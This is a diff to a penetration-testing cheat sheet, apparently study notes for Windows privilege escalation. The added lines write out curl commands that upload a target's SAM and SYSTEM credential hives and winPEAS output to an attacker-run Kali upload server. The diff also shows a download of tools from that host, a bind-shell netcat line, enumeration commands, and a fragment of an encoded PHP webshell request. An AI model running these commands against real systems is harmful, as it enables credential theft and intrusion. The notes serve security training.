@@ -326,6 +326,26 @@ Kali port:
       ```
 - Windows to Kali 
   - Internet access
+    - Download Kali exe to target
+      ```
+      cd /var/www/html
+      sudo python3 -m http.server 80
+      nc <target> <port>
+      iwr -uri http://<kali>/<program> -Outfile <program>  
+      ```
+    - UploadServer (nc, No GUI, no credentails)
+      ```
+      #kali
+      mkdir -p /home/kali/uploads
+      cd /home/kali/uploads
+      pipx install uploadserver
+      pipx run uploadserver --directory /home/kali/uploads 8008
+
+      #target
+      curl -X POST http://<kali>:8008/upload -F "files=@C:\Users\enterpriseuser\sam"
+      curl -X POST http://<kali>:8008/upload -F "files=@C:\Users\enterpriseuser\system"
+      curl -X POST http://<kali>:8008/upload -F "files=@C:\Users\enterpriseuser\winPEAS-results.txt"
+      ```
     - WsgiDAV
       ```
       sudo apt install pipx -y
@@ -785,39 +805,33 @@ NobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"`
 # Windows priviledge  
 - Bind shell to target , port xxx
   `nc 192.168.124.220 4444` (Trial & Error port: 80,445,443,4444,8888,8080,9999)  
+  `C:\Users\<user>>powershell`  
+- SID User
+  - S-<Revision>-<IdentifierAuthority>-<SubAuthority1>-<SubAuthority2>-...-<RID>
+  - S-1-5-21-2309961351-4093026482-2223492918-1002
 - Enumerating windows
   ```
-  #Users
+  #User
+  whoami
   systeminfo
+  *whoami /user
+  *whoami /priv
+  *whoami /groups
+  *net user <user>
+  ipconfig /all
   ipconfig /all
   Get-Process
-  whoami
-  whoami /user #S-<Revision>-<IdentifierAuthority>-<SubAuthority1>-<SubAuthority2>-...-<RID>
-  S-1-5-21-2294905130-3135521385-938276-1001
-  Get-LocalUser
-  net user steve
-  whoami /priv
-
-  #Group
-  whoami /groups
-  Get-LocalGroup
-  net user backupadmin
-
-  #specific group
-  Get-LocalGroupMember <adminteam>
   
-  #specific member
+  #Users
+  *Get-LocalUser
+  
+  #Group 
+  *Get-LocalGroup
+  *Get-LocalGroupMember <adminteam>
 
   #installed applications
-  Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
-  Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname 
-
-  displayname
-
-  Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
-  Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
-
-  DisplayName   
+  *Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
+  *Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
   ```
 
 - User's note  
@@ -840,7 +854,7 @@ NobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"`
     #target
     C:\Users\dave> powershell
     PS C:\Users\dave> iwr -uri http://192.168.48.3/winPEASx64.exe -Outfile winPEAS.exe
-    C:\Users\dave> .\winPEAS.exe
+    C:\Users\dave> .\winPEASx64.exe | Out-File winPEAS-results.txt
     ```
  - Review "Basic System Information", "PS default transcripts history", "Users", "Looking for possible password files in users homes"
 - Leveraging Windows Services
